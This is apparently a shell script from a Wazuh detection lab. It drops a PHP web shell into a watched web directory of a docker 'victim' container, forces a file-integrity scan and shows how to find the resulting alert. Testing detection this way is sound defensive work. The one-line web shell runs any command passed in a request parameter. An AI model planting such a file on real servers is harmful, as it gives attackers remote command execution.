#!/usr/bin/env bash
# Drop a webshell-looking file in the FIM-watched directory.
set -euo pipefail
docker compose exec -T victim bash -lc "
cat > /var/www/html/shell.php <<'PHP'
<?php if(isset(\$_REQUEST['cmd'])) { system(\$_REQUEST['cmd']); } ?>
PHP
ls -la /var/www/html/shell.php
"
echo "==> Webshell created."
echo "    /var/www/html is watched in realtime (see scenarios/Dockerfile.victim), so the"
echo "    alert should appear within seconds. Force a scan anyway if it does not:"
AGENT_ID=$("$(dirname "$0")"/victim-agent-id.sh)
docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -r -u "$AGENT_ID" || true
echo
echo "    Check without the dashboard:"
echo "      docker compose exec -T wazuh.manager sh -c \"grep shell.php /var/ossec/logs/alerts/alerts.json | tail -1\" | jq ."
